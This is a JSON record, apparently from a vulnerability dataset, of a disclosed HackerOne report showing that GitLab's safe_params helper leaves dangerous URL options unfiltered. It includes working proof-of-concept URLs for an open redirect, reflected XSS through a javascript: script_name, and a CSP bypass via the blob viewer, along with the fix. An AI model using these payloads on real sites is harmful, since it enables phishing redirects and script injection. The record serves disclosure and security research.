@@ -1,0 +1,45 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "vakzz ",
+  "title": "SafeParamsHelper::safe_params is not so safe",
+  "content": "\nSummary\nGitLab uses SafeParamsHelper to filter out some keys before passing them to url_for:\nCode 142 Bytes\n1  def safe_params\n2    if params.respond_to?(:permit!)\n3      params.except(:host, :port, :protocol).permit!\n4    else\n5      params\n6    end\n7  end\nThe issue is that there are a lot more dangerous keys:\nCode 234 Bytes\n1RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length,\n2                          :trailing_slash, :anchor, :params, :only_path, :script_name,\n3                          :original_script_name, :relative_url_root]\nThis means that anywhere safe_params is used, the domain could be changed using the domain query. Most of the build_canonical_path methods call url_for(safe_params) which then gets used by RoutableActions:\nCode 536 Bytes\n1def ensure_canonical_path(routable, requested_full_path)\n2    return unless request.get?\n3\n4    canonical_path = routable.full_path\n5    if canonical_path != requested_full_path\n6      if !request.xhr? && request.format.html? && canonical_path.casecmp(requested_full_path) != 0\n7        flash[:notice] = \"#{routable.class.to_s.titleize} '#{requested_full_path}' was moved to '#{canonical_path}'. Please update any links and bookmarks that may still have the old path.\"\n8      end\n9\n10      redirect_to build_canonical_path(routable)\n11    end\n12  end\nThis creates an open redirect in all of the RoutableActions routes by making canonical_path != requested_full_path (eg using a capital letter) and adding the domain param:\nVisit https://gitlab.com/vakzz-h1/Redirect1?domain=aw.rs\nYou will be redirected to https://aw.rs/\nThe other key that can be abused is script_name, as this is appended to the start of the url and can be used to fake a protocol such as javascript:\nVisit https://gitlab.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1)//\n<a class=\"btn btn-svg has-tooltip\" data-container=\"body\" title=\"\"  href=\"javascript:alert(1)//vakzz-h1/redirect1/-/issues.atom?feed_token=XXXX&amp;state=opened\" data-original-title=\"Subscribe to RSS feed\">\n<svg class=\"s16 qa-rss-icon\" data-testid=\"rss-icon\">\n<use xlink:href=\"https://gitlab.com/assets/icons-37f758fe6359f04ae912169432d8ddd9dd45a1316d8fa634996c10bd033e9726.svg#rss\"></use>\n</svg>\n</a>\nOn gitlab.com this is blocked by the CSP\nThere are a bunch of other places that use safe_params that could be exploited such as the _viewer.html.haml\nCode 264 Bytes\n1- viewer_url = local_assigns.fetch(:viewer_url) { url_for(safe_params.merge(viewer: viewer.type, format: :json)) } if load_async\n2.blob-viewer{ data: { type: viewer.type, rich_type: rich_type, url: viewer_url, path: viewer.blob.path }, class: ('hidden' if hidden) }\nThis allows an attacker to specify the viewer_url for the blob url. Since the json returned by the url has an html attributes it allows arbitrary html to be inserted. The below uses https://gitlab.com/-/snippets/1999965 as the viewer url and 1 click csp bypass (same as https://hackerone.com/reports/662287#activity-6026826) with https://gitlab.com/-/snippets/1999974/raw for the js payload:\nVisit https://gitlab.com/vakzz-h1/redirect1/-/blob/master/test.txt?script_name=/-/snippets/1999965/raw%23\n<form>any <b>html</b> can go <button>here<a data-remote=\"true\" data-method=\"get\" data-type=\"script\" href=\"https://gitlab.com/-/snippets/1999974/raw\" class=\"atwho-view select2-drop-mask pika-select\">\n<img width=\"10000\" height=\"10000\">\n</a></button></form>\n\nClicking anywhere will trigger an alert\nI've only skimmed the other locations that use safe_params but it looks like there are a few more that load data via javascript or could be turned into open redirects. I also haven't looked into the impact of the open redirects to see if they could be escalated to leak sensitive information, I'll update the report if I find anything else.\nI've put all of these in a single report as the mitigation is the same for all of them, but if you would like me to split them into separate reports I can do that as well. I've also set the severity to high due to the number of places that this is used and relative ease of trigger it, but the individual issues are probably less so might need to be adjusted.\nWhat is the current bug behavior?\nSafeParamsHelper.safe_params only filters out the keys :host, :port, :protocol but there are other dangerous ones\nWhat is the expected correct behavior?\nSafeParamsHelper.safe_params should filter out all of the reserved options:\nCode 234 Bytes\n1RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length,\n2                          :trailing_slash, :anchor, :params, :only_path, :script_name,\n3                          :original_script_name, :relative_url_root]\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nopen redirect on quire a few routes\nreflected xss using the javascript protocol\nreflected xss with csp bypass using the blob viewer\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 4000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Reflected"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1604369940,
+  "report_url": "https://hackerone.com/reports/946728",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Visit https://gitlab.com/vakzz-h1/Redirect1?domain=aw.rs to trigger an open redirect to https://aw.rs/"
+    ],
+    [
+      2,
+      "Visit https://gitlab.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1)// to trigger a reflected XSS via the javascript protocol"
+    ]
+  ],
+  "vuln_description": "The SafeParamsHelper.safe_params method in GitLab fails to filter out all dangerous reserved options, leading to multiple vulnerabilities including open redirects, reflected XSS via javascript protocol, and CSP bypass through blob viewer manipulation.",
+  "reason": "The vulnerability requires understanding of Rails URL generation parameters and their security implications, but the attack vectors are straightforward once these parameters are known. The main complexity comes from recognizing the impact of unfiltered parameters across different contexts (redirects, XSS, CSP bypass).",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "662287",
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves unsafe parameter handling in the `SafeParamsHelper::safe_params` method, which allows for open redirects and XSS attacks by not filtering all dangerous keys. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, but this issue is more about improper input validation and parameter filtering. The methodologies do not specifically address the detection of unsafe parameter handling or open redirect vulnerabilities.",
+    "is_detectable": false
+  }
+}
